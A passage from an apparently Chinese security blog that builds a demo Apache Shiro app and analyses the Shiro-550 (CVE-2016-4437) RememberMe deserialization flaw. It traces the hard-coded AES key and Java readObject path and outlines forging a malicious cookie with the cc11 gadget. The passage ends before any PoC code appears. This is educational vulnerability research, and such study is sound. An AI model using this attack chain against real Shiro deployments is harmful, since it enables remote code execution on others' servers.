</span></span><span style="display:flex;"><span>        Set&lt;String&gt; roles = <span style="color:#fff;font-weight:bold">new</span> HashSet&lt;&gt;();
</span></span><span style="display:flex;"><span>        roles.<span style="color:#007f7f">add</span>(<span style="color:#0ff;font-weight:bold">&#34;admin&#34;</span>);
</span></span><span style="display:flex;"><span>        roles.<span style="color:#007f7f">add</span>(<span style="color:#0ff;font-weight:bold">&#34;user&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">return</span> roles;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    @Override
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">protected</span> AuthenticationInfo doGetAuthenticationInfo(AuthenticationToken authenticationToken) <span style="color:#fff;font-weight:bold">throws</span> AuthenticationException {
</span></span><span style="display:flex;"><span>        String username = (String) authenticationToken.<span style="color:#007f7f">getPrincipal</span>();
</span></span><span style="display:flex;"><span>        String password = getPasswordByUsername(username);
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">if</span>(password == <span style="color:#fff;font-weight:bold">null</span>){
</span></span><span style="display:flex;"><span>            <span style="color:#fff;font-weight:bold">return</span> <span style="color:#fff;font-weight:bold">null</span>;
</span></span><span style="display:flex;"><span>        }<span style="color:#fff;font-weight:bold">else</span>{
</span></span><span style="display:flex;"><span>            <span style="color:#fff;font-weight:bold">return</span> <span style="color:#fff;font-weight:bold">new</span> SimpleAuthenticationInfo(username,password,<span style="color:#0ff;font-weight:bold">&#34;myShiroRealm&#34;</span>);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">public</span> String getPasswordByUsername(String username){
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">return</span> userMap.<span style="color:#007f7f">get</span>(username);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></td></tr></table>
</div>
</div><p>同时我们来定义<code>login</code>,<code>index</code>,<code>logout</code>三个路由来作为我们测试。</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">19
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">20
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">21
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">22
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">23
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">24
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">25
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">26
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">27
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">28
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">29
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">30
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">31
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">32
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">33
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>@Controller
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">public</span> <span style="color:#fff;font-weight:bold">class</span> HelloController {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    @RequestMapping(<span style="color:#0ff;font-weight:bold">&#34;/index&#34;</span>)
</span></span><span style="display:flex;"><span>    @ResponseBody
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">public</span> String index(){
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">return</span> <span style="color:#0ff;font-weight:bold">&#34;hello , this is demo&#34;</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    @ResponseBody
</span></span><span style="display:flex;"><span>    @RequestMapping(<span style="color:#0ff;font-weight:bold">&#34;/login&#34;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">public</span> String login(String username , String password){
</span></span><span style="display:flex;"><span>        Subject subject = SecurityUtils.<span style="color:#007f7f">getSubject</span>();
</span></span><span style="display:flex;"><span>        UsernamePasswordToken usernamePasswordToken = <span style="color:#fff;font-weight:bold">new</span> UsernamePasswordToken(username, password);
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">try</span> {
</span></span><span style="display:flex;"><span>            subject.<span style="color:#007f7f">login</span>(usernamePasswordToken);
</span></span><span style="display:flex;"><span>            <span style="color:#fff;font-weight:bold">return</span> <span style="color:#0ff;font-weight:bold">&#34;hello, this is demo&#34;</span>;
</span></span><span style="display:flex;"><span>        } <span style="color:#fff;font-weight:bold">catch</span> (Exception ex){
</span></span><span style="display:flex;"><span>            <span style="color:#fff;font-weight:bold">return</span> <span style="color:#0ff;font-weight:bold">&#34;sorry, 你还没有登录&#34;</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    @ResponseBody
</span></span><span style="display:flex;"><span>    @RequestMapping(<span style="color:#0ff;font-weight:bold">&#34;/403&#34;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">public</span> String unAuthorized(){
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">return</span> <span style="color:#0ff;font-weight:bold">&#34;403 no Authorized&#34;</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    @RequestMapping(<span style="color:#0ff;font-weight:bold">&#34;/logout&#34;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">public</span> String logout(){
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">return</span> <span style="color:#0ff;font-weight:bold">&#34;forward:/login&#34;</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></td></tr></table>
</div>
</div><p>在 Servlet 项目中，是通过在 <code>web.xml</code> 中配置了能匹配所有 URL 路径 <code>/*</code> 的 ShiroFilter，并由其执行后续逻辑。而在 Spring 生态下，由于 IoC 与 DI 的思想，通常把所有的 Filter 注册成为 Bean 交给 Spring 来管理。</p>
<p>此时如果想要将 Shiro 逻辑注入其中，就用到了关键类：<code>ShiroFilterFactoryBean</code>。这是 Shiro 为 Spring 生态提供的工厂类，由它在 spring 中承担了之前 ShiroFilter 的角色。</p>
<p>因此来配置我们的<code>shiro Filter</code>来实现用户认证过程。</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">19
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">20
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">21
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">22
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">23
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">24
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">25
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">26
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">27
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">28
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">29
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">30
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">31
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">32
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">33
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">34
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>@Configuration
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">public</span> <span style="color:#fff;font-weight:bold">class</span> ShiroConfig {
</span></span><span style="display:flex;"><span>    @Bean
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">public</span> ShiroFilterFactoryBean shiroFilter(SecurityManager securityManager){
</span></span><span style="display:flex;"><span>        ShiroFilterFactoryBean shiroFilterFactoryBean = <span style="color:#fff;font-weight:bold">new</span> ShiroFilterFactoryBean();
</span></span><span style="display:flex;"><span>        shiroFilterFactoryBean.<span style="color:#007f7f">setSecurityManager</span>((SecurityManager) securityManager);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#007f7f">// 拦截器
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>        Map&lt;String,String&gt; filterChainDefinitionMap = <span style="color:#fff;font-weight:bold">new</span> LinkedHashMap&lt;&gt;();
</span></span><span style="display:flex;"><span>        <span style="color:#007f7f">// filterChainDefinitionMap.put(&#34;/static/**&#34;,&#34;anno&#34;);
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>        filterChainDefinitionMap.<span style="color:#007f7f">put</span>(<span style="color:#0ff;font-weight:bold">&#34;/logout&#34;</span>,<span style="color:#0ff;font-weight:bold">&#34;logout&#34;</span>);
</span></span><span style="display:flex;"><span>        filterChainDefinitionMap.<span style="color:#007f7f">put</span>(<span style="color:#0ff;font-weight:bold">&#34;/**&#34;</span>,<span style="color:#0ff;font-weight:bold">&#34;authc&#34;</span>);
</span></span><span style="display:flex;"><span>        shiroFilterFactoryBean.<span style="color:#007f7f">setLoginUrl</span>(<span style="color:#0ff;font-weight:bold">&#34;/login&#34;</span>);
</span></span><span style="display:flex;"><span>        shiroFilterFactoryBean.<span style="color:#007f7f">setSuccessUrl</span>(<span style="color:#0ff;font-weight:bold">&#34;/index&#34;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        shiroFilterFactoryBean.<span style="color:#007f7f">setUnauthorizedUrl</span>(<span style="color:#0ff;font-weight:bold">&#34;/403&#34;</span>);
</span></span><span style="display:flex;"><span>        shiroFilterFactoryBean.<span style="color:#007f7f">setFilterChainDefinitionMap</span>(filterChainDefinitionMap);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">return</span> shiroFilterFactoryBean;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    @Bean
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">public</span> MyShiroRealm myShiroRealm(){
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">return</span> <span style="color:#fff;font-weight:bold">new</span> MyShiroRealm();
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    @Bean
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">public</span> SecurityManager securityManager(){
</span></span><span style="display:flex;"><span>        DefaultWebSecurityManager securityManager = <span style="color:#fff;font-weight:bold">new</span> DefaultWebSecurityManager();
</span></span><span style="display:flex;"><span>        securityManager.<span style="color:#007f7f">setRealm</span>(myShiroRealm());
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">return</span> securityManager;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></td></tr></table>
</div>
</div><p>没有进行认证前。</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230319145538543.png" alt="image-20230319145538543"  />
</p>
<p>认证后：</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230319145616533.png" alt="image-20230319145616533"  />
</p>
<p><code>logout</code>，退出登录之后，会注销掉我们的权限和认证的用户，再次访问<code>/index</code>，会重定向到<code>/login</code>路径。</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230319145804623.png" alt="image-20230319145804623"  />
</p>
<h2 id="shiro-550漏洞分析">Shiro-550漏洞分析<a hidden class="anchor" aria-hidden="true" href="#shiro-550漏洞分析">#</a></h2>
<h3 id="漏洞信息">漏洞信息<a hidden class="anchor" aria-hidden="true" href="#漏洞信息">#</a></h3>
<table>
<thead>
<tr>
<th style="text-align:left">漏洞信息</th>
<th style="text-align:left">详情</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">漏洞编号</td>
<td style="text-align:left"><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0074">CVE-2016-4437</a> / <a href="https://www.cnvd.org.cn/flaw/show/CNVD-2016-03869">CNVD-2016-03869</a> / <a href="https://issues.apache.org/jira/browse/SHIRO-550">SHIRO-550</a></td>
</tr>
<tr>
<td style="text-align:left">影响版本</td>
<td style="text-align:left">shiro 1.x &lt; 1.2.5</td>
</tr>
<tr>
<td style="text-align:left">漏洞描述</td>
<td style="text-align:left">如果程序未能正确配置 “remember me” 功能使用的密钥。 攻击者可通过发送带有特制参数的请求利用该漏洞执行任意代码或访问受限制内容。</td>
</tr>
<tr>
<td style="text-align:left">漏洞关键字</td>
<td style="text-align:left">cookie | RememberMe | 反序列化 | 硬编码 | AES</td>
</tr>
<tr>
<td style="text-align:left">漏洞补丁</td>
<td style="text-align:left"><a href="https://github.com/apache/shiro/commit/4d5bb000a7f3c02d8960b32e694a565c95976848">Commit-4d5bb00</a></td>
</tr>
<tr>
<td style="text-align:left">相关链接</td>
<td style="text-align:left"><a href="https://issues.apache.org/jira/browse/SHIRO-441">SHIRO-441</a> <a href="https://www.anquanke.com/post/id/192619">https://www.anquanke.com/post/id/192619</a></td>
</tr>
</tbody>
</table>
<h3 id="漏洞详解">漏洞详解<a hidden class="anchor" aria-hidden="true" href="#漏洞详解">#</a></h3>
<p>Shiro 从 0.9 版本开始设计了 RememberMe 的功能，用来提供在应用中记住用户登陆状态的功能。</p>
<h5 id="remembermemanager">RememberMeManager<a hidden class="anchor" aria-hidden="true" href="#remembermemanager">#</a></h5>
<p>首先是接口 <code>org.apache.shiro.mgt.RememberMeManager</code>，这个接口提供了 5 个方法：</p>
<ul>
<li><code>getRememberedPrincipals</code>：在指定上下文中找到记住的 principals，也就是 RememberMe 的功能。</li>
<li><code>forgetIdentity</code>：忘记身份标识。</li>
<li><code>onSuccessfulLogin</code>：在登陆校验成功后调用，登陆成功时，保存对应的 principals 供程序未来进行访问。</li>
<li><code>onFailedLogin</code>：在登陆失败后调用，登陆失败时，在程序中“忘记”该 Subject 对应的 principals。</li>
<li><code>onLogout</code>: 在用户退出时调用，当一个 Subject 注销时，在程序中“忘记”该 Subject 对应的 principals。</li>
</ul>
<h5 id="abstractremembermemanager">AbstractRememberMeManager<a hidden class="anchor" aria-hidden="true" href="#abstractremembermemanager">#</a></h5>
<p>同时，Shiro 还提供了一个实现了 <code>RememberMeManager</code> 接口的抽象类 <code>AbstractRememberMeManager</code>，提供了一些实现技术细节。先介绍其中重要的几个成员变量：</p>
<ul>
<li><code>DEFAULT_CIPHER_KEY_BYTES</code>：一个 Base64 的硬编码的 AES Key，也是本次漏洞的关键点，这个 key 会被同时设置为加解密 key 成员变量：encryptionCipherKey/decryptionCipherKey 。</li>
<li><code>serializer</code>：Shiro 提供的序列化器，用来对序列化和反序列化标识用户身份的 PrincipalCollection 对象。</li>
<li><code>cipherService</code>：用来对数据加解密的类，实际上是 <code>org.apache.shiro.crypto.AesCipherService</code> 类，这是一个对称加密的实现，所以加解密的 key 是使用了同一个。</li>
</ul>
<p>在其初始化时，会创建 <code>DefaultSerializer</code> 作为序列化器，<code>AesCipherService</code> 作为加解密实现类，<code>DEFAULT_CIPHER_KEY_BYTES</code> 作为加解密的 key。</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230319150328312.png" alt="image-20230319150328312"  />
</p>
<h5 id="cookieremembermemanager">CookieRememberMeManager<a hidden class="anchor" aria-hidden="true" href="#cookieremembermemanager">#</a></h5>
<p>在 shiro-web 包中提供了具体的实现类 CookieRememberMeManager，实现了在 HTTP 无状态协议中使用 cookie 记录用户信息的相关能力。其中一个比较重要的方法是 <code>getRememberedSerializedIdentity</code>，具体逻辑如下图：</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230319150530988.png" alt="image-20230319150530988"  />
</p>
<p>简单来说就是实现了，读取<code>Cookie</code>的值，然后base64解密并返回字节数组。</p>
<h3 id="漏洞分析">漏洞分析<a hidden class="anchor" aria-hidden="true" href="#漏洞分析">#</a></h3>
<p>在 Filter 处理流程中，无论是 ShiroFilter 还是 IniShiroFilter， <code>doFilter</code> 方法都是继承至 AbstractShiroFilter，会调用 <code>AbstractShiroFilter#doFilterInternal</code> 方法，使用保存的 SecurityManager 创建 Subject 对象。具体调用流程大概如下：</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230319152109357.png" alt="image-20230319152109357"  />
</p>
<p>创建 Subject 对象后，会试图从利用当前的上下文中的信息来解析当前用户的身份，将会调用 <code>DefaultSecurityManager#resolvePrincipals</code> 方法，继续调用 <code>AbstractRememberMeManager#getRememberedPrincipals</code> 方法，如下图：</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230319152241281.png" alt="image-20230319152241281"  />
</p>
<p>然后调用<code>org.apache.shiro.web.mgt.CookieRememberMeManager#getRememberedSerializedIdentity</code>方法来将<code>Cookie</code>进行base64解密。</p>
<p>然后调用<code>org.apache.shiro.mgt.AbstractRememberMeManager#convertBytesToPrincipals</code>方法，里面关注<code>decrypt</code>方法和<code>deserialize</code>方法。</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230319154238333.png" alt="image-20230319154238333"  />
</p>
<p><code>decrypt</code>方法是AesCipherService 进行解密。</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230319154406804.png" alt="image-20230319154406804"  />
</p>
<p>在 Shiro 中，序列化器的默认实现是 DefaultSerializer，可以看到其 <code>deserialize</code> 方法使用 Java 原生反序列化，使用 ByteArrayInputStream 将 byte 转为 ObjectInputStream ，并调用 <code>readObject</code> 方法执行反序列化操作。</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230319154521905.png" alt="image-20230319154521905"  />
</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230319154539047.png" alt="image-20230319154539047"  />
</p>
<p>以上就是 Shiro 创建 Subject 时执行的逻辑，跟下来后就看到了完整的漏洞触发链：</p>
<p>攻击者构造恶意的反序列化数据，使用硬编码的 AES 加密，然后 Base64 编码放在 Cookie 中，即可触发漏洞利用。</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20210418211722559.png" alt="image-20210418211722559"  />
</p>
<h3 id="漏洞利用">漏洞利用<a hidden class="anchor" aria-hidden="true" href="#漏洞利用">#</a></h3>
<p>这里我们利用 cc11 来加载我们的恶意代码来打过去，cc11 的好处在于可以直接加载字节码，例如 cc6 和 cc11的区别就是一个是命令执行一个是代码执行，相比之下肯定是我们的代码执行危害比较大</p>
<p>Shiro 使用 <code>ClassResolvingObjectInputStream</code> 执行反序列化的操作，这个类重写了 <code>resolveClass</code> ，实际使用 <code>ClassLoader.loadClass()</code> 方式而非 ObjectInputStream 中的 <code>Class.forName()</code> 的方式。而 <code>forName</code> 的方式可以加载任意的数组类型，<code>loadClass</code> 只能加载原生的类型的 Object Array。</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230319195206455.png" alt="image-20230319195206455"  />
</p>
<p>在代码审计知识星球中的《Java安全漫谈 - 15.TemplatesImpl在Shiro中的利用.pdf》 及 《Shiro-1-2-4-RememberMe反序列化漏洞分析-CVE-2016-4437.pdf》两篇文章中针对此问题进行了讨论和调试。</p>
<p>cc11 的 Poc</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10
